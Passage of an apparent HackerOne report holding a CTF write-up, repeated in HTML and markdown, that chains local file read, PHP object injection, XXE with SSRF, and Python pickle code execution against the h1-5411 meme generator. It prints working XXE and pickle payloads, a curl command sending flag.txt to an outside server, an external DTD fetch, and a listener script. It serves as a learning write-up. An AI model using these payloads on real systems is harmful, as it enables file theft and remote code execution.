PzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=488c2ab368505f8acc9b317377c4698643f00a7ddd392be4b2f3bb4ff14966f1\" class=\"markdown-inline-image\"></a></p>\n\n<p>No dice. We run into a warning saying we cannot array_merge an array and an object. It makes sense, looking back on the code in /includes/config.php we can see that $_SESSION[\u201cmemes\u201d] is an array() and gets strings stored in it.</p>\n<pre class=\"highlight plaintext\"><code>  // Start/Resume session\n  session_start();\n\n  // Setup session\n  if (!isset($_SESSION[&#39;memes&#39;])) {\n    $_SESSION[&#39;memes&#39;] = array();\n  }\n</code></pre>\n<p>So in order for our object to get stored into the $_SESSION[\u201cmemes\u201d], we have to wrap the serialized object in an array. That complicates things because the only way we found to exploit the toString() method was that the $_SESSION[\u201cmemes\u201d] was echo\u2019d on the export script. That means we needed to find a new way for it to execute the toString magic method.</p>\n\n<p>Lucky for us, we discovered this in the generate.php file.</p>\n<pre class=\"highlight plaintext\"><code>        foreach($_SESSION[&#39;memes&#39;] as $meme) {\n      ?&gt;\n        &lt;iframe width=&quot;100%&quot; height=&quot;450&quot; frameborder=&quot;0&quot;\n                src=&quot;&lt;?php echo htmlentities($meme); ?&gt;&quot;&gt;&lt;/iframe&gt;\n      &lt;?php\n        }\n      }\n      ?&gt;\n</code></pre>\n<p>As you can see in the code, it loops through all the items in the $_SESSION[\u201cmeme\u201d] array and displays them via echo. When it hits our object stored in the array, it\u2019ll trigger toString() and thus eventually execute our XXE payload.</p>\n\n<p>Here is an example of loading file:///etc/passwd using the XXE payload:</p>\n<pre class=\"highlight plaintext\"><code>class ConfigFile {\n    ...\n}\n\n$test = new ConfigFile(&quot;asdf&quot;);\n$test-&gt;config_raw = &#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY foo SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&lt;toptext&gt;dddrrr &amp;foo;&lt;/toptext&gt;&lt;/test&gt;&#39;;\n\necho base64_encode(serialize(array($test)));\n</code></pre>\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"8.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/671/a04f227f9867ec5a02c85c4ee027319d228044a8/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b07d11247de59c76a4908d9a8280c42c7c471082ba6eb7ac94253f2d9367a14b\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/671/a04f227f9867ec5a02c85c4ee027319d228044a8/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b07d11247de59c76a4908d9a8280c42c7c471082ba6eb7ac94253f2d9367a14b\" class=\"markdown-inline-image\"></a></p>\n\n<p>Boom! We confirmed that we finally got XXE working.</p>\n\n<p>So what do we do next? Well, we already have local-file read, so it probably has nothing to do with that. We remembered that we saw a mention of localhost in one of the files. XXE gives us the ability to perform Server-Side Request Forgery and due to the XML being rendered back to the user, it was not blind either. This gives us the ability to fetch and view internal websites or services.</p>\n\n<p>This was a comment in <strong><em>/includes/classes.php</em></strong></p>\n<pre class=\"highlight plaintext\"><code>  /* Maintenance service: internal service on localhost, still under development!!\n\n  class Maintenance {\n    function __construct() {\n      //TODO\n    }\n  }\n\n  */\n</code></pre>\n<p>We started to try various http:// calls to localhost but we were not having any luck. Eventually we guessed it may be on a random port and our first guess was correct! We got a response from querying <a title=\"http://localhost:1337\" href=\"/redirect?signature=68488600f56abf95b90937ef563c390acdf2c5aa&amp;url=http%3A%2F%2Flocalhost%3A1337\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost:1337</span><i class=\"icon-external-link\"></i></a>. The maintenance service was on the port <strong><em>1337</em></strong>.</p>\n\n<p>The non-blind XXE payload was critical for discovering the 1337 port and functionality:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE root\n[\n&lt;!ENTITY foo SYSTEM &quot;php://filter/convert.base64-encode/resource=http://localhost:1337/&quot;&gt;</span>\n]&gt;<span class=\"nt\">&lt;test&gt;&lt;toptext&gt;</span> <span class=\"ni\">&amp;foo;</span><span class=\"nt\">&lt;/toptext&gt;&lt;/test&gt;</span>\n</code></pre>\n<p>And this would return:</p>\n<pre class=\"highlight plaintext\"><code>Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: \n/status - View maintenance status; \n/update-status Change maintenance status; \nDebug: The debug parameter allows debugging;\n</code></pre>\n<p>Oh no, more challenges to solve.</p>\n\n<p>Accessing /status?debug=1 printed:</p>\n<pre class=\"highlight plaintext\"><code>Maintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4=\n</code></pre>\n<p>Base64 decoding the string we immediately recognized that it was Python pickle. This is essentially Python&#39;s version of serialization and has similar object injection vulnerabilities. However, Python pickle generally just leads immediately to Remote Code Execution.</p>\n<pre class=\"highlight plaintext\"><code>(iapp\nStatus\np1\n(dp2\nS&#39;message&#39;\np3\nS&#39;Maintenance mode: off&#39;\np4\nsS&#39;maintenance&#39;\np5\nI00\nSb.\n</code></pre>\n<p>Therefore, we should try and update the status with a \u201cmalicious\u201d pickle!</p>\n\n<p>Sending through a valid formed pickle to /update-status?status=&lt;base64 pickle&gt;&amp;debug=1 resulted in the message:</p>\n<pre class=\"highlight plaintext\"><code>A new status has been loaded. Automatic reloading not implemented yet!\n</code></pre>\n<p>There was no impact to the /status page unfortunately (a malformed pickle would show error output), this means we have to work blind, lucily this \u201cmalicious\u201d pickle payload generator worked!  So our strategy going forward was to use this with curl commands:<br>\n<a title=\"https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd\" href=\"/redirect?signature=1cc955d7b4057aed55a1eaf4ee3319495c19cf7e&amp;url=https%3A%2F%2Fgist.github.com%2Fmgeeky%2Fcbc7017986b2ec3e247aab0b01a9edcd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Ran as:</p>\n<pre class=\"highlight plaintext\"><code># python pickle.py &#39;curl -X POST -d &quot;|$(cat flag.txt)|&quot; myserver.com&#39;\nY3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==\n</code></pre>\n<p>Add to php payload:</p>\n<pre class=\"highlight plaintext\"><code>$test-&gt;config_raw = &#39;&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE root\n[\n&lt;!ENTITY foo SYSTEM &quot;php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&amp;debug=1&quot;&gt;\n]&gt;&lt;test&gt;&lt;toptext&gt; &amp;foo;&lt;/toptext&gt;&lt;/test&gt;&#39;;\n</code></pre>\n<p>New mypack file to upload:</p>\n<pre class=\"highlight plaintext\"><code>YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czozMTA6Ijw/eG1sIHZlcnNpb249IjEuMCI/Pg0KPCFET0NUWVBFIHJvb3QNClsNCjwhRU5USVRZIGZvbyBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aHR0cDovL2xvY2FsaG9zdDoxMzM3L3VwZGF0ZS1zdGF0dXM/c3RhdHVzPVkzQnZjMmw0Q25ONWMzUmxiUXB3TVFvb1V5ZGpkWEpzSUMxWUlGQlBVMVFnTFdRZ0lud2tLR05oZENCbWJHRm5MblI0ZENsOElpQnRlWE5sY25abGNpNWpiMjBuQ25BeUNuUlNjRE1LTGc9PSZkZWJ1Zz0xIj4NCl0+PHRlc3Q+PHRvcHRleHQ+ICZmb287PC90b3B0ZXh0PjwvdGVzdD4iO319\n</code></pre>\n<p>When memes.php is visited again, simply get the POST response with a simple tornado listener:</p>\n<pre class=\"highlight plaintext\"><code>import tornado.ioloop\nimport tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        print self.request.body\n\ndef make_app():\n    return tornado.web.Application([\n        (r&quot;/.*&quot;, MainHandler),\n    ])\n\nif __name__ == &quot;__main__&quot;:\n    app = make_app()\n    app.listen(80)\n    tornado.ioloop.IOLoop.current().start()\n</code></pre>\n<p>Using this method to look at the file system (\u201cpython pickle.py &#39;curl -X POST -d &quot;|$(ls -lath)|&quot; myserver.com\u201d) yields:</p>\n<pre class=\"highlight plaintext\"><code>total 36K\ndrwxr-xr-x 1 root        root        4.0K Sep 26 16:20 ..\ndrwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 .\ndrwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 static\n-rw-r--r-- 1 maintenance maintenance 1.7K Sep 23 19:28 app.py\n-rw-r--r-- 1 maintenance maintenance 3.4K Sep 23 19:11 app.pyc\n-rw-r--r-- 1 maintenance maintenance  150 Sep 23 19:07 flag.txt\n-rw-r--r-- 1 maintenance maintenance   14 Sep 18 17:50 requirements.txt\n-rw-r--r-- 1 maintenance maintenance   89 Sep 18 17:50 status.pickle\ndrwxr-xr-x 1 maintenance maintenance 4.0K Sep 18 17:50 templates\n</code></pre>\n<p>Using this method to look at flag.txt (\u201cpython pickle.py &#39;curl -X POST -d &quot;|$(cat flag.txt)|&quot; myserver.com\u201d) shows the flag:</p>\n<pre class=\"highlight plaintext\"><code>Yay! Here is your flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\n\nGo to https://hackerone.com/h1-5411-ctf and submit your writeup!\n</code></pre>\n<p>PHP code used to generate payload (this works on <a title=\"http://sandbox.onlinephpfunctions.com/):\" href=\"/redirect?signature=91182c09e88216b6126f2f2aa2fbb8ad972f076b&amp;url=http%3A%2F%2Fsandbox.onlinephpfunctions.com%2F%29%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://sandbox.onlinephpfunctions.com/):</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight xml\"><code><span class=\"err\">&lt;</span>?php\n\n$qqq= array(&quot;test&quot;, &quot;abc&quot;);\n\nclass ConfigFile {\n    function __construct($url) {\n      $this-&gt;config_raw = $url;//file_get_contents($url);\n    }\n    function parse() {\n        echo &#39;<span class=\"nt\">&lt;p&gt;</span>DEBUG: parse() hit (current config_raw = &#39;.htmlspecialchars($this-&gt;config_raw).&#39; )<span class=\"nt\">&lt;/p&gt;</span>&#39;;\n      $dom = new DOMDocument();\n      $dom-&gt;loadXML($this-&gt;config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this-&gt;top_text = $o-&gt;toptext;\n      $this-&gt;bottom_text = $o-&gt;bottomtext;\n      $this-&gt;template = $o-&gt;template;\n      $this-&gt;type = $o-&gt;type;\n    }\n\n    function generate() {\n      $this-&gt;parse();\n      $meme_path = &quot;https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder&quot;;\n      if ($this-&gt;type == IMAGE) {\n        if (@is_array(getimagesize($this-&gt;path))) {\n          $meme_path = MEMES_FOLDER . $filename . &quot;.jpg&quot;;\n          $args = array(\n            &quot;top_text&quot;    =&gt; $top_text,\n            &quot;bottom_text&quot; =&gt; $bottom_text,\n            &quot;filename&quot;    =&gt; $meme_path,\n            &quot;font&quot;        =&gt; FONT_BASE,\n            &quot;memebase&quot;    =&gt; $this-&gt;path,\n            &quot;textsize&quot;    =&gt; 40,\n            &quot;textfit&quot;     =&gt; true,\n            &quot;padding&quot;     =&gt; 10,\n          );\n          memegen_build_image($args);\n        }\n      }\n      if ($this-&gt;type == TEXT) {\n        if (!@is_array(getimagesize($this-&gt;path))) {\n          $contents = file_get_contents($this-&gt;path);\n          $meme = &quot;  &quot; . strtoupper($top_text) . &quot;\\n\\n&quot; . $contents . &quot;\\n  &quot; . strtoupper($bottom_text);\n          $meme_path = MEMES_FOLDER . $filename . &quot;.txt&quot;;\n          file_put_contents($meme_path, $meme);\n        }\n      }\n      return $meme_path;\n    }\n    function __toString() {\n        echo &#39;<span class=\"nt\">&lt;p&gt;</span>DEBUG: toString() hit<span class=\"nt\">&lt;/p&gt;</span>&#39;;\n      $this-&gt;parse();\n      $debug = &quot;&quot;;\n      $debug .= &quot;Debug Info :\\n&quot;;\n      $debug .= &quot;TopText =&gt; {$this-&gt;top_text}\\n&quot;;\n      $debug .= &quot;BottomText =&gt; {$this-&gt;bottom_text}\\n&quot;;\n      $debug .= &quot;Template Location =&gt; {$this-&gt;template}\\n&quot;;\n      $debug .= &quot;Template Type =&gt; {$this-&gt;type}\\n&quot;;\n      return $debug;\n    }\n}\n\n$test = new ConfigFile(&quot;asdf&quot;);\n\n$test-&gt;config_raw = &#39;<span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE root\n[\n&lt;!ENTITY foo SYSTEM &quot;php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&amp;debug=1&quot;&gt;</span>\n]&gt;<span class=\"nt\">&lt;test&gt;&lt;toptext&gt;</span> <span class=\"ni\">&amp;foo;</span><span class=\"nt\">&lt;/toptext&gt;&lt;/test&gt;</span>&#39;;\n\n$serialized = base64_encode(serialize(array($test)));\n\n// test to make sure array_merge still works\n$new_memes = unserialize(base64_decode($serialized));\n$qqq = array_merge($qqq, $new_memes);\n\n// print it\necho $serialized;\n\n?&gt;\n\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>Content injection</p>\n", 
    "vulnerability_information": "@erbbysam and I recently set out to beat the latest CTF challenge hosted by HackerOne. Here is a write-up with the process we took from start to finish.\n\nThe h1-5411 CTF begins with a tweet from HackerOne:\n * https://twitter.com/Hacker0x01/status/1044974142150373378\n\n{F351665}\n\nThis leads to a website called the HackerOne Meme Generator:\n * https://h1-5411.h1ctf.com/\n\nThe website allows you to select a meme template, top text, and bottom text. This generates a meme saved to your session that is either an image or txt file.\n\n{F351664}\n\n***Generating a Meme***\n\nThe POST request looks like the following:\n\n```\nPOST /api/generate.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://h1-5411.h1ctf.com/generate.php\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 63\nCookie: PHPSESSID=qpvh9cil4heghbjdq6cp4vfbgs\nConnection: close\n\ntemplate=template4.txt&type=text&top-text=test&bottom-text=test\n```\n\nThe template parameter sets a filename to use as part of the meme generation process.\n\n{F351666}\n\nAs you may guess, the template variable is vulnerable to Local-File Read (LFR). As long as you set it to a txt template, you can specify any arbitrary file on the system and fetch its\u2019 file contents. Here\u2019s an example of fetching PHP source code:\n\n{F351667}\n\nHere you can see the source code when viewing your saved memes:\n\n{F351668}\n\nAfter enumerating from index.php to all the files inside of each file include(), we eventually have the source code for the entire application. The next step is to figure out what other vulnerabilities exist in the app.\n\nIn the ***/includes/classes.php*** file the first thing that stands out is that they are intentionally disabling XXE protection.\n\n{F351669}\n\nThat means the DOMDocument->loadXML() is vulnerable to external entities/DTDs and would allow us to execute malicious XXE payloads. The question from here is, how do we set ConfigFile class\u2019s config_raw variable.\n\nFrom the ***/includes/header.php*** file, there are two interesting files that you cannot discover without the LFR vulnerability.\n\n * /import_memes_2.0.php\n * /export_memes_2.0.php\n\nEach one sends a POST request to files of the same name in the /api/ directory.\n\n***/api/import_memes_2.0.php***\n\n```\n<?php\n  require_once(\"../includes/config.php\");\n\n  if (isset($_FILES['f'])) {\n    $new_memes = unserialize(base64_decode(\n      file_get_contents($_FILES['f']['tmp_name'])));\n    $_SESSION['memes'] = array_merge($_SESSION['memes'], $new_memes);\n  }\n\n  header(\"Location: /memes.php\");\n?>\n```\n\n***/api/export_memes_2.0.php***\n\n```\n<?php\n  require_once(\"../includes/config.php\");\n\n  header('Content-Type: application/octet-stream');\n  header('Content-Disposition: attachment; filename=\"'.time().'_export.memepak\"');\n  echo base64_encode(serialize($_SESSION['memes']));\n?>\n```\n\nWith the import API script, we are able to specify input into unserialize() with file upload POST requests. The uploaded unserialized data gets merged into $_SESSION[\u201cmemes\u201d] where all of your memes are saved.\n\nNow that we knew we could create PHP objects via unserialize (object injection) and knowing that there is an XXE in the ConfigFile class, we had to figure out how to put it all together.\n\nThe ConfigClass has a magic method function __toString() that will get called any time the class is initialized and treated as a string. That usually means whenever the variable that has the class assigned to is echo, print, print_r, etc.\n\n```\n    function __toString() {\n      $this->parse();\n      $debug = \"\";\n      $debug .= \"Debug Info :\\n\";\n      $debug .= \"TopText => {$this->top_text}\\n\";\n      $debug .= \"BottomText => {$this->bottom_text}\\n\";\n      $debug .= \"Template Location => {$this->template}\\n\";\n      $debug .= \"Template Type => {$this->type}\\n\";\n      return $debug;\n    }\n```\n\nWe\u2019ll talk about how that gets triggered after further explaining the attack. Following the __toString() execution chain, we see that it immediately calls the parse() function.\n\n```\n    function parse() {\n      $dom = new DOMDocument();\n      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this->top_text = $o->toptext;\n      $this->bottom_text = $o->bottomtext;\n      $this->template = $o->template;\n      $this->type = $o->type;\n    }\n```\n\nThis is promising because $this->config_raw gets passed into the vulnerable loadXML() function call and does not get overwritten with anything static. That means if we create an object that gets unserialized, we can specify the config_raw variable and it will execute our XXE payload.\nWe setup a test script by ripping out all the code involved in this attack chain in order to test it locally with warnings enabled. Their server is not displaying any PHP errors or warnings meaning we\u2019re completely blind to any potential roadblocks that we run into. \n\nHere is a gist of the test code we were playing with:\n\n * https://gist.githubusercontent.com/ziot/e72c8c45865ea86d9c6aa6975615e839/raw/d0fb09a5a99be0c815c3e854e5b9900f2384b5dd/gistfile1.txt\n\nUsing the script above, we ran base64_encode(serialize()) functions on top of the newly created class after specifying our XXE payload inside of config_raw.\n\nExample:\n\n```\nclass ConfigFile {\n    ...\n}\n\n$test = new ConfigFile(\"asdf\");\n$test->config_raw = '<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM \"https://xss.buer.haus/ev.xml\">%sp;%param1;]><r>&exfil;</r>';\n\necho base64_encode(serialize($test));\n```\n\nThe next step was uploading it using the import_memes script:\n * https://h1-5411.h1ctf.com/import_memes_2.0.php\n\n{F351670}\n\nNo dice. We run into a warning saying we cannot array_merge an array and an object. It makes sense, looking back on the code in /includes/config.php we can see that $_SESSION[\u201cmemes\u201d] is an array() and gets strings stored in it.\n```\n  // Start/Resume session\n  session_start();\n\n  // Setup session\n  if (!isset($_SESSION['memes'])) {\n    $_SESSION['memes'] = array();\n  }\n```\n\nSo in order for our object to get stored into the $_SESSION[\u201cmemes\u201d], we have to wrap the serialized object in an array. That complicates things because the only way we found to exploit the toString() method was that the $_SESSION[\u201cmemes\u201d] was echo\u2019d on the export script. That means we needed to find a new way for it to execute the toString magic method.\n\nLucky for us, we discovered this in the generate.php file.\n\n```\n        foreach($_SESSION['memes'] as $meme) {\n      ?>\n        <iframe width=\"100%\" height=\"450\" frameborder=\"0\"\n                src=\"<?php echo htmlentities($meme); ?>\"></iframe>\n      <?php\n        }\n      }\n      ?>\n```\n\n\n\nAs you can see in the code, it loops through all the items in the $_SESSION[\u201cmeme\u201d] array and displays them via echo. When it hits our object stored in the array, it\u2019ll trigger toString() and thus eventually execute our XXE payload.\n\nHere is an example of loading file:///etc/passwd using the XXE payload:\n\n```\nclass ConfigFile {\n    ...\n}\n\n$test = new ConfigFile(\"asdf\");\n$test->config_raw = '<?xml version=\"1.0\"?><!DOCTYPE root[<!ENTITY foo SYSTEM \"file:///etc/passwd\">]><test><toptext>dddrrr &foo;</toptext></test>';\n\necho base64_encode(serialize(array($test)));\n```\n\n{F351671}\n\nBoom! We confirmed that we finally got XXE working.\n\nSo what do we do next? Well, we already have local-file read, so it probably has nothing to do with that. We remembered that we saw a mention of localhost in one of the files. XXE gives us the ability to perform Server-Side Request Forgery and due to the XML being rendered back to the user, it was not blind either. This gives us the ability to fetch and view internal websites or services.\n\nThis was a comment in ***/includes/classes.php***\n\n```\n  /* Maintenance service: internal service on localhost, still under development!!\n\n  class Maintenance {\n    function __construct() {\n      //TODO\n    }\n  }\n \n  */\n```\n\nWe started to try various http:// calls to localhost but we were not having any luck. Eventually we guessed it may be on a random port and our first guess was correct! We got a response from querying http://localhost:1337. The maintenance service was on the port ***1337***.\n\nThe non-blind XXE payload was critical for discovering the 1337 port and functionality:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE root\n[\n<!ENTITY foo SYSTEM \"php://filter/convert.base64-encode/resource=http://localhost:1337/\">\n]><test><toptext> &foo;</toptext></test>\n```\n\nAnd this would return:\n\n```\nMeme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: \n/status - View maintenance status; \n/update-status Change maintenance status; \nDebug: The debug parameter allows debugging;\n```\n\nOh no, more challenges to solve.\n\nAccessing /status?debug=1 printed:\n\n```\nMaintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4=\n```\n\nBase64 decoding the string we immediately recognized that it was Python pickle. This is essentially Python's version of serialization and has similar object injection vulnerabilities. However, Python pickle generally just leads immediately to Remote Code Execution.\n\n```\n(iapp\nStatus\np1\n(dp2\nS'message'\np3\nS'Maintenance mode: off'\np4\nsS'maintenance'\np5\nI00\nSb.\n```\n\nTherefore, we should try and update the status with a \u201cmalicious\u201d pickle!\n\nSending through a valid formed pickle to /update-status?status=<base64 pickle>&debug=1 resulted in the message:\n\n```\nA new status has been loaded. Automatic reloading not implemented yet!\n```\n\nThere was no impact to the /status page unfortunately (a malformed pickle would show error output), this means we have to work blind, lucily this \u201cmalicious\u201d pickle payload generator worked!  So our strategy going forward was to use this with curl commands:\nhttps://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd\n\nRan as:\n```\n# python pickle.py 'curl -X POST -d \"|$(cat flag.txt)|\" myserver.com'\nY3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==\n```\n\n\nAdd to php payload:\n\n```\n$test->config_raw = '<?xml version=\"1.0\"?>\n<!DOCTYPE root\n[\n<!ENTITY foo SYSTEM \"php://filter/convert.base64-encode/resource=http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydjdXJsIC1YIFBPU1QgLWQgInwkKGNhdCBmbGFnLnR4dCl8IiBteXNlcnZlci5jb20nCnAyCnRScDMKLg==&debug=1\">\n]><test><toptext> &foo;</toptext></test>';\n```\n\nNew mypack file to upload:\n```\nYToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czozMTA6Ijw/eG1sIHZlcnNpb249IjEuMCI/Pg0KPCFET0NUWVBFIHJvb3QNClsNCjwhRU5USVRZIGZvbyBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aHR0cDovL2xvY2FsaG9zdDoxMzM3L3VwZGF0ZS1zdGF0dXM/c3RhdHVzPVkzQnZjMmw0Q25ONWMzUmxiUXB3TVFvb1V5ZGpkWEpzSUMxWUlGQlBVMVFnTFdRZ0lud2tLR05oZENCbWJHRm5MblI0ZENsOElpQnRlWE5sY25abGNpNWpiMjBuQ25BeUNuUlNjRE1LTGc9PSZkZWJ1Zz0xIj4NCl0+PHRlc3Q+PHRvcHRleHQ+ICZmb287PC90b3B0ZXh0PjwvdGVzdD4iO319\n```\n\nWhen memes.php is visited again, simply get the POST response with a simple tornado listener:\n\n```\nimport tornado.ioloop\nimport tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        print self.request.body\n\ndef make_app():\n    return tornado.web.Application([\n        (r\"/.*\", MainHandler),\n    ])\n\nif __name__ == \"__main__\":\n    app = make_app()\n    app.listen(80)\n    tornado.ioloop.IOLoop.current().start()\n```\n\nUsing this method to look at the file system (\u201cpython pickle.py 'curl -X POST -d \"|$(ls -lath)|\" myserver.com\u201d) yields:\n\n```\ntotal 36K\ndrwxr-xr-x 1 root        root        4.0K Sep 26 16:20 ..\ndrwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 .\ndrwxr-xr-x 1 maintenance maintenance 4.0K Sep 26 16:19 static\n-rw-r--r-- 1 maintenance maintenance 1.7K Sep 23 19:28 app.py\n-rw-r--r-- 1 maintenance maintenance 3.4K Sep 23 19:11 app.pyc\n-rw-r--r-- 1 maintenance maintenance  150 Sep 23 19:07 flag.txt\n-rw-r--r-- 1 maintenance maintenance   14 Sep 18 17:50 requirements.txt\n-rw-r--r-- 1 maintenance maintenance   89 Sep 18 17:50 status.pickle\ndrwxr-xr-x 1 maintenance maintenance 